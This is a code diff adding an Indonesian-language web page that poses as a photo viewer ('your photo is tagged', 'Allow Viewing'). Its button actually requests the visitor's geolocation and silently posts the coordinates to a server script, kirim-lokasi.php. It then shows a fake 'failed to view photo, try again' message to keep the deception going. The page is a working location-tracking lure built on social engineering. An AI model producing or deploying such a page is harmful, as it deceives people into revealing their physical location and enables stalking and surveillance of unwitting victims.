@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Melihat Gambar</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        padding: 50px;
+      }
+
+      button {
+        padding: 12px 20px;
+        font-size: 16px;
+        background-color: #007bff;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+      }
+
+      button:hover {
+        background-color: #0056b3;
+      }
+
+      #status {
+        margin-top: 20px;
+        color: gray;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Menunggu Untuk Melihat</h2>
+    <button onclick="getLocation()">Izinkan Melihat</button>
+    <p id="status">Fhoto Anda Di Tandai</p>
+
+    <script>
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendLocation, showError);
+          document.getElementById("status").innerText = "⏳ Mengambil lokasi...";
+        } else {
+          document.getElementById("status").innerText = "❌ Geolocation tidak didukung oleh perangkat Anda.";
+        }
+      }
+
+      function sendLocation(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        fetch("kirim-lokasi.php", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: `lat=${lat}&lon=${lon}`
+        })
+        .then(res => res.text())
+        .then(response => {
+          document.getElementById("status").innerText = "Gagal Melihat Fhoto Coba Lagi";
+          // Bisa juga redirect ke halaman lain, misalnya:
+          // window.location.href = "https://example.com/konten-anda";
+        })
+        .catch(error => {
+          document.getElementById("status").innerText = "❌ Gagal mengirim lokasi.";
+        });
+      }
+
+      function showError(error) {
+        switch(error.code) {
+          case error.PERMISSION_DENIED:
+            document.getElementById("status").innerText = "❌ Anda menolak untuk melihat.";
+            break;
+          case error.POSITION_UNAVAILABLE:
+            document.getElementById("status").innerText = "❌ Lokasi tidak tersedia.";
+            break;
+          case error.TIMEOUT:
+            document.getElementById("status").innerText = "❌ Timeout mengambil lokasi.";
+            break;
+          default:
+            document.getElementById("status").innerText = "❌ Terjadi kesalahan.";
+        }
+      }
+    </script>
+  </body>
+</html>
